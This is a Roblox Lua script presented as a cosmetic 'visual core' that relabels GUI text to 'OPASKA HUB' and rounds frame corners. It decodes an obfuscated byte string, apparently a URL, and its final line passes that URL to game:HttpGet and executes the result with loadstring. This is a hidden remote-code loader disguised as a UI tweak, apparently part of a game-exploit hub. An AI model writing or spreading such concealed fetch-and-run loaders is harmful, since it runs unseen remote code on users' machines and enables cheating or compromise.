
--[[ STAGE 2: VISUAL CORE ]]
local I1dGilnlIsLqX5T7="\216\200\204\204\209\158\181\185\224\243\233\240\003\006\015\026\222\021\037\039\237\022\039\033\253\093\092\104\080\088\255\084\111"local Afejv8JdSC1OwK4q9e=49 local w1QtH503OPljf3QL3NL7e6=114 local rKPcaOdSzEXX07=0 local u2zKMnJoR7Cr5ewRmC8ypE=4 local G9WbwWsMLcqvRh8QmtL=9 local aL58kE1scgERWnq8sjK=false local GUGVDLHOSRKD=bit32 and bit32.bxor if not GUGVDLHOSRKD then GUGVDLHOSRKD=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local gfse78mb7fuHrcIKFHN={}for uLXQDMpXgAY73fUsy04=1,#I1dGilnlIsLqX5T7 do local BoUApvCvAZOKPH=string.byte(I1dGilnlIsLqX5T7,uLXQDMpXgAY73fUsy04)local MS7kMoGJ28kPNU=(w1QtH503OPljf3QL3NL7e6+(uLXQDMpXgAY73fUsy04*u2zKMnJoR7Cr5ewRmC8ypE)+G9WbwWsMLcqvRh8QmtL)%256 if rKPcaOdSzEXX07==0 then BoUApvCvAZOKPH=(BoUApvCvAZOKPH-MS7kMoGJ28kPNU)%256 gfse78mb7fuHrcIKFHN[uLXQDMpXgAY73fUsy04]=string.char(GUGVDLHOSRKD(BoUApvCvAZOKPH,Afejv8JdSC1OwK4q9e))else BoUApvCvAZOKPH=GUGVDLHOSRKD(BoUApvCvAZOKPH,Afejv8JdSC1OwK4q9e)gfse78mb7fuHrcIKFHN[uLXQDMpXgAY73fUsy04]=string.char((BoUApvCvAZOKPH-MS7kMoGJ28kPNU)%256)end end local fqVBeDyTpsrKeF4rlxS=table.concat(gfse78mb7fuHrcIKFHN)if aL58kE1scgERWnq8sjK then fqVBeDyTpsrKeF4rlxS=string.reverse(fqVBeDyTpsrKeF4rlxS)end local LQLkYZA74teo0e=fqVBeDyTpsrKeF4rlxS
local HubName = "OPASKA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(LQLkYZA74teo0e))()
